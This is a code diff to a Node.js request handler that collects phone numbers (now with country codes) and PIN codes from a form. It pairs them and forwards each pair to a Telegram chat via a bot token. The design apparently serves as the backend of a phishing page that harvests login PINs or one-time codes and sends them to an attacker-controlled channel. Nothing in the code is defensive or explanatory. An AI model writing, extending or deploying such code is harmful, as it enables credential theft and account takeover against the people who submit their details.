@@ -1,8 +1,8 @@
 import fetch from 'node-fetch';
 
 // Configuration (Environment Variables)
-  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Data storage for phone and PIN tracking
 const clientData = {};
@@ -35,23 +35,26 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: "Method Not Allowed" });
   }
 
-  const { phoneNumber, pinCode } = req.body;
+  const { phoneNumber, countryCode, pinCode } = req.body;
 
   try {
-    // Handle phone number submission
-    if (phoneNumber && !pinCode) {
-      if (clientData[phoneNumber]) {
+    // Handle phone number and country code submission
+    if (phoneNumber && countryCode && !pinCode) {
+      // Create the full phone number with the country code and space
+      const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
+
+      if (clientData[fullPhoneNumber]) {
         return res.status(400).json({ error: "Phone number already submitted." });
       }
 
-      clientData[phoneNumber] = { pin: null, state: 'waiting' };
-      console.log(`Received phone number: ${phoneNumber}`);
-      await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
+      clientData[fullPhoneNumber] = { pin: null, state: 'waiting' };
+      console.log(`Received full phone number: ${fullPhoneNumber}`);
+      await sendTelegramMessage(`New Phone Number Submission:\nFull Phone Number: ${fullPhoneNumber}`);
       return res.status(200).json({ status: "Phone number received. Waiting for PIN." });
     }
 
     // Handle PIN code submission
-    if (pinCode && !phoneNumber) {
+    if (pinCode && !phoneNumber && !countryCode) {
       const waitingPhoneNumber = Object.keys(clientData).find(
         (key) => clientData[key].state === 'waiting' && clientData[key].pin === null
       );
@@ -62,12 +65,12 @@ export default async function handler(req, res) {
 
       clientData[waitingPhoneNumber] = { pin: pinCode, state: 'completed' };
       console.log(`Received PIN: ${pinCode} for phone number: ${waitingPhoneNumber}`);
-      await sendTelegramMessage(`New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`);
+      await sendTelegramMessage(`New Client Submission:\nFull Phone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`);
       return res.status(200).json({ status: "PIN code received and sent to Telegram." });
     }
 
     // If neither phoneNumber nor pinCode is valid
-    return res.status(400).json({ error: "Invalid data. Expected either phoneNumber or pinCode." });
+    return res.status(400).json({ error: "Invalid data. Expected either phoneNumber and countryCode or pinCode." });
   } catch (error) {
     console.error("Error handling POST request:", error);
     return res.status(500).json({ error: "Internal server error." });
